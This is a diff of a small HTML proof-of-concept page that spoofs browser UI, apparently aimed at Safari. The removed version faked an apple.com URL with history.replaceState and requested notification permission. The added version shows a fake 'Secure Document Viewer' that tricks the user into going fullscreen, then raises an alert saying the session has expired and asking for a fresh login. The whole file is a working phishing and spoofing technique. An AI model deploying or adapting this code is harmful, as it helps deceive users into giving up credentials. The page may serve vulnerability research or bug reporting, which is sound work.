@@ -1,53 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Session Timed Out</title>
+  <title>Secure Document Viewer</title>
   <style>
-    html, body {
-      margin: 0; padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background: white;
+    body, html {
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      font-family: sans-serif;
     }
-    .center {
-      height: 100vh;
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: white;
       display: flex;
       align-items: center;
       justify-content: center;
       flex-direction: column;
+      z-index: 9999;
+    }
+    .fake-ui {
+      border: 1px solid #ccc;
+      padding: 30px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      text-align: center;
     }
     button {
-      padding: 12px 20px;
+      margin-top: 20px;
+      padding: 10px 20px;
       font-size: 16px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 5px;
     }
   </style>
 </head>
 <body>
-<div class="center">
-  <h2>🔒 Your session expired</h2>
-  <p>Please re-login to continue.</p>
-  <button onclick="start()">Continue</button>
+
+<div class="overlay" id="overlay">
+  <div class="fake-ui">
+    <h2>🔒 Secure Preview</h2>
+    <p>This document requires fullscreen permission.</p>
+    <button onclick="triggerSpoof()">Allow Fullscreen</button>
+  </div>
 </div>
 
 <script>
-function spoofNotificationPrompt() {
+function triggerSpoof() {
   document.documentElement.requestFullscreen().then(() => {
-    // Optional: location.replace spoofing or fake visual context
-    history.replaceState({}, '', 'https://apple.com/re-auth');
-
-    // Delay to ensure Safari trusts the gesture
     setTimeout(() => {
-      Notification.requestPermission().then(permission => {
-        if (permission === "granted") {
-          new Notification("✅ Session restored successfully!");
-        }
-      });
-    }, 1000);
+      // Simulate native alert without any context shown in Safari
+      alert("Your session has expired. Please login again to continue.");
+    }, 600);
   });
 }
-
-function start() {
-  spoofNotificationPrompt();
-}
 </script>
+
 </body>
 </html>
